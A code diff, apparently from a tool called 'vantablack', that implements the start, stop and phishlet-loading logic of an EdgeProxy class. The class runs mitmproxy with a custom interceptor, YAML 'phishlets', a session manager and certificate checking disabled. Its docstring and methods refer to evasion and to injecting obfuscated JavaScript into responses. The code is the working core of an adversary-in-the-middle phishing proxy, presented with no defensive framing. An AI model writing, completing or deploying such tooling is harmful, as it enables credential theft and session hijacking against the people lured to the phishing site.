@@ -10,10 +10,16 @@ It handles:
 - Traffic shaping and evasion
 """
 
+import asyncio
 from typing import Optional, Dict, List
 import logging
 from dataclasses import dataclass
 from enum import Enum
+from mitmproxy.tools.dump import DumpMaster
+from mitmproxy import options
+from core.edge.interceptor import VantaInterceptor
+from core.edge.phishlets import PhishletLoader
+from core.edge.session import SessionManager
 
 class ProxyMode(str, Enum):
     TRANSPARENT = "transparent"
@@ -39,22 +45,52 @@ class EdgeProxy:
         self.config = config
         self.logger = logging.getLogger("vantablack.edge")
         self._running = False
+        self._master: Optional[DumpMaster] = None
+        self.session_manager = SessionManager()
+        self.phishlet_loader = PhishletLoader()
         
-    async def start(self):
-        """Start the proxy service"""
+    async def start(self, phishlet_yaml: str):
+        """Start the proxy service with a specific phishlet"""
         self.logger.info(f"Starting Edge Proxy on {self.config.listen_host}:{self.config.listen_port}")
-        # TODO: Initialize mitmproxy master
+        
+        # Load Phishlet
+        phishlet = self.phishlet_loader.load_from_yaml(phishlet_yaml)
+        
+        # Configure mitmproxy options
+        opts = options.Options(
+            listen_host=self.config.listen_host,
+            listen_port=self.config.listen_port,
+            # mode=f"reverse:{self.config.target_host}", # In V5, mode is handled by interceptor mapping
+            ssl_insecure=True
+        )
+        
+        self._master = DumpMaster(opts)
+        
+        # Add Vanta Interceptor
+        interceptor = VantaInterceptor(phishlet, self.session_manager)
+        self._master.addons.add(interceptor)
+        
         self._running = True
+        try:
+            await self._master.run()
+        except Exception as e:
+            self.logger.error(f"Proxy runtime error: {e}")
+        finally:
+            self._running = False
         
     async def stop(self):
         """Stop the proxy service"""
         self.logger.info("Stopping Edge Proxy")
+        if self._master:
+            self._master.shutdown()
         self._running = False
 
     def load_phishlet(self, phishlet_path: str):
         """Load a phishlet configuration for interception rules"""
-        pass
+        with open(phishlet_path, 'r') as f:
+            return self.phishlet_loader.load_from_yaml(f.read())
 
     def inject_script(self, flow, script_content: str):
         """Inject obfuscated JS into the response"""
+        # Logic moved to Interceptor
         pass
